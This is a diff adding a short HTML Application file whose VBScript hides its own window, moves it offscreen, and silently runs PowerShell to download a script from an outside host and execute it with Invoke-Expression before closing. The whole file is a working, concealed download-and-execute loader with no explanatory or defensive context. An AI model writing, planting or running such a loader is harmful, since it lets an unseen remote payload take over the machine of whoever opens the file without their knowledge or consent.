@@ -1,0 +1,29 @@
+<html>
+<head>
+<HTA:APPLICATION
+  ID="InvisibleHTA"
+  APPLICATIONNAME="Invisible HTA"
+  BORDER="none"
+  CAPTION="no"
+  SHOWINTASKBAR="no"
+  SINGLEINSTANCE="yes"
+  WINDOWSTATE="minimize"
+>
+
+<script language="VBScript">
+    ' Hide the HTA window
+    window.resizeTo 0,0
+    window.moveTo -2000,-2000
+
+    ' Run Command Prompt
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell.exe -Command ""Invoke-WebRequest 'https://saturn.chickenjockey.dev/dgchk/get.ps1' | Invoke-Expression"""
+
+    ' Close the HTA
+    self.close
+</script>
+
+</head>
+<body>
+</body>
+</html>
